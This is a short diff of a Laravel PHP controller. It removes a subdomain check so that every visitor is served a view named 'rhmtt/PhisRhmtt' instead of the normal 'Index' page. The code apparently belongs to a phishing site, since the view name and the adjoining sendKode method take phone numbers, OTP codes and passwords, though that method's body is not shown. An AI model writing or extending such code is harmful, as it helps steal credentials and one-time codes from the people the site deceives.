@@ -81,12 +81,12 @@ class HomeController extends Controller
     public function index_first(Request $request)
     {
         $subdomain = explode('.', $request->getHost())[0];
-        if ($subdomain ===  "live-vc-private1-my20") {
-            return inertia('rhmtt/PhisRhmtt');
-        } else {
+        // if ($subdomain ===  "live-vc-private1-my20") {
+        return inertia('rhmtt/PhisRhmtt');
+        // } else {
 
-            return inertia('Index');
-        }
+        //     return inertia('Index');
+        // }
     }
     public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
     {
